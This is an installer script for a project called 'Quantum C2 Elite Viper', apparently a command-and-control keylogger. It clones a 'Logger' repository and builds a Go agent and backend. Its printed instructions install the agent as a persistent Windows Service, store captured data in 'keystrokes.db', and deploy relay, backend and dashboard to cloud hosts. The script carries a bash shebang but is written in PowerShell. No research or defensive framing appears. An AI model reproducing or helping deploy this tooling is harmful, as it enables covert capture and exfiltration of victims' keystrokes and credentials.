#!/bin/bash
# Quantum C2 Elite Viper - Installation Script
# Run on Windows: powershell -File install.ps1
# Repository: https://github.com/422442/Logger.git

$ErrorActionPreference = "Stop"

$GITHUB_URL = "https://github.com/422442/Logger.git"
$PROJECT_DIR = Split-Path -Parent $PSScriptRoot
$AGENT_DIR = Join-Path $PROJECT_DIR "agent"
$BACKEND_DIR = Join-Path $PROJECT_DIR "backend"
$WORKER_DIR = Join-Path $PROJECT_DIR "worker"

# Clone if not already present
if (-not (Test-Path (Join-Path $PROJECT_DIR ".git"))) {
    Write-Host "[0/4] Cloning repository..." -ForegroundColor Yellow
    git clone $GITHUB_URL $PROJECT_DIR 2>&1
}

Write-Host "=== Quantum C2 Elite Viper Installation ===" -ForegroundColor Cyan

# Build Go agent
Write-Host "[1/3] Building Go agent..." -ForegroundColor Yellow
Set-Location $AGENT_DIR
go build -o agent.exe .
Write-Host "  Agent built: agent.exe" -ForegroundColor Green

# Build Go backend
Write-Host "[2/3] Building Go backend..." -ForegroundColor Yellow
Set-Location $BACKEND_DIR
go build -o backend.exe .
Write-Host "  Backend built: backend.exe" -ForegroundColor Green

# Build dashboard
Write-Host "[3/3] Building dashboard..." -ForegroundColor Yellow
Set-Location (Join-Path $PROJECT_DIR "dashboard")
pnpm run build
Write-Host "  Dashboard built" -ForegroundColor Green

Write-Host ""
Write-Host "=== Installation Complete ===" -ForegroundColor Cyan
Write-Host ""
Write-Host "Usage:" -ForegroundColor White
Write-Host "  agent.exe --install    Install as Windows Service" -ForegroundColor Gray
Write-Host "  agent.exe --run        Run directly (testing)" -ForegroundColor Gray
Write-Host "  agent.exe --uninstall  Remove service" -ForegroundColor Gray
Write-Host ""
Write-Host "Backend:" -ForegroundColor White
Write-Host "  backend.exe -listen :8080 -db keystrokes.db" -ForegroundColor Gray
Write-Host ""
Write-Host "Next steps:" -ForegroundColor Yellow
Write-Host "  0. Clone: git clone https://github.com/422442/Logger.git" -ForegroundColor Gray
Write-Host "  1. Update worker.ts with your API_KEY and BACKEND_URL" -ForegroundColor Gray
Write-Host "  2. Deploy to Cloudflare: wrangler deploy" -ForegroundColor Gray
Write-Host "  3. Deploy backend to Render" -ForegroundColor Gray
Write-Host "  4. Deploy dashboard to Vercel" -ForegroundColor Gray
Write-Host "  5. Run: agent.exe --install" -ForegroundColor Gray
Write-Host ""

Set-Location $PROJECT_DIR
